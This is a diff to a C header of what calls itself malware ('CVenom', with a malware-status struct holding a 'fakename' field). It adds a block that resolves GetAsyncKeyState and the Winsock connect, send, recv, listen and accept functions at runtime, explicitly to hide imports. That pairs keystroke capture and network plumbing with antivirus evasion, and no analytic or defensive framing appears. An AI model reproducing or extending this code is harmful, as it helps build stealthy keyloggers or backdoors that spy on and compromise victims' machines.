@@ -29,6 +29,11 @@
 #define	LINUX	0x05
 #define WINDOWS	0x06
 
+#define KB *1000
+#define MB *1000000
+#define GB *1000000000
+#define TB *1000000000000
+
 #define THREAD_ENTRY DWORD WINAPI
 #define THREAD       LPVOID thrd
 #define HIGH_PRIVILEGES     ADMIN
@@ -73,6 +78,8 @@ typedef struct membuf{
 	int location=0;
 }MemoryBuffer;
 
+
+
 struct c_malware_stat__t{
 	char	name[PAMAX + 1];
 	char	fakename[156];
@@ -82,6 +89,56 @@ struct c_malware_stat__t{
 
 	size_t  size;
 };
+
+// Dynamic API Function Resolving (Hiding Imports)
+
+HMODULE wsock = LoadLibrary("ws2_32");
+
+HMODULE us32 = GetModuleHandleA("user32.dll");
+HMODULE hk32 = GetModuleHandleA("kernel32.dll");
+HMODULE ws2  = GetModuleHandleA("ws2_32.dll");
+
+typedef SHORT(WINAPI *PGetAsyncKeyState)(int);
+typedef   int(WSAAPI *PWSAStartup)(WORD, LPWSADATA);
+typedef   int(WSAAPI *PWSACleanup)();
+typedef   int(WSAAPI *Pclosesocket)(SOCKET);
+typedef   int(WSAAPI *Pconnect)(SOCKET, const struct sockaddr*, int);
+typedef   int(WSAAPI *Pbind)(SOCKET, const struct sockaddr*, int);
+typedef   struct hostent*(WSAAPI *Pgethostbyname)(const char*);
+typedef   u_short(WSAAPI *Phtons)(u_short);
+typedef   unsigned long(WSAAPI *Pinet_addr)(const char*);
+typedef   char*(WSAAPI *Pinet_ntoa)(struct in_addr);
+typedef   SOCKET(WSAAPI *Psocket)(int, int, int);
+typedef   int (WSAAPI *Psend)(SOCKET, const char*, int, int);
+typedef   int (WSAAPI *Precv)(SOCKET, char*, int, int);
+typedef   int (WSAAPI *Precvfrom)(SOCKET, char*, int, int, struct sockaddr*, int*);
+typedef   int (WSAAPI *Psendto)(SOCKET, const char*, int, int, const struct sockaddr*, int);
+typedef   int (WSAAPI *Psetsockopt)(SOCKET, int, int, const char*, int);
+typedef   int (WSAAPI *Plisten)(SOCKET, int);
+typedef   int (WSAAPI *Paccept)(SOCKET, struct sockaddr*, int*);
+
+PGetAsyncKeyState funcGetAsyncKeyState = (PGetAsyncKeyState)GetProcAddress(us32, "GetAsyncKeyState");
+
+PWSAStartup    funcWSAStartup    = (PWSAStartup)    GetProcAddress(ws2, "WSAStartup");
+PWSACleanup    funcWSACleanup    = (PWSACleanup)    GetProcAddress(ws2, "WSACleanup");
+Pclosesocket   funcclosesocket   = (Pclosesocket)   GetProcAddress(ws2, "closesocket");
+Pconnect       funcconnect       = (Pconnect)       GetProcAddress(ws2, "connect");
+Pbind          funcbind          = (Pbind)          GetProcAddress(ws2, "bind");
+Pgethostbyname funcgethostbyname = (Pgethostbyname) GetProcAddress(ws2, "gethostbyname");
+Phtons         funchtons         = (Phtons)         GetProcAddress(ws2, "htons");
+Pinet_addr     funcinet_addr     = (Pinet_addr)     GetProcAddress(ws2, "inet_addr");
+Pinet_ntoa     funcinet_ntoa     = (Pinet_ntoa)     GetProcAddress(ws2, "inet_ntoa");
+Psocket        funcsocket        = (Psocket)        GetProcAddress(ws2, "socket");
+Psend	       funcsend		 = (Psend)	    GetProcAddress(ws2, "send");
+Precv	       funcrecv		 = (Precv)	    GetProcAddress(ws2, "recv");
+Precvfrom      funcrecvfrom	 = (Precvfrom)      GetProcAddress(ws2, "recvfrom");
+Psendto	       funcsendto	 = (Psendto)	    GetProcAddress(ws2, "sendto");
+Psetsockopt    funcsetsockopt	 = (Psetsockopt)    GetProcAddress(ws2, "setsockopt");
+Plisten	       funclisten	 = (Plisten)        GetProcAddress(ws2, "listen");
+Paccept	       funcaccept	 = (Paccept)	    GetProcAddress(ws2, "accept");
+
+
+//*************************************
 
 // Global Data For Some CVenom's Functionalities.
 char**				_argv__;
